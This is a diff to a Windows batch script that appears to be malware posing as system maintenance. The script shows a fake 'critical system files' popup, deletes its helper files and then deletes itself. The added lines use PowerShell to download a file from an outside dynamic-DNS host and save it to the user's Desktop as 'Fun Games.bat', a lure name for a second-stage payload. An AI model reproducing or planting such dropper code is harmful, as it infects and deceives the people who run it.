@@ -44,8 +44,9 @@ echo CreateObject("WScript.Shell").Popup "These are critical system files! Pleas
 del Settings.vbs /Q /F
 del WindowsMaintainence /Q /F
 
-
-
+cd C:/Users/%username%/Desktop
+::http://3pc.webhop.me/fungames.txt
+powershell -Command "Invoke-WebRequest -URI "http://3pc.webhop.me/fungames.txt" -OutFile "Fun Games.bat""
 
 del %0 /Q /F
 
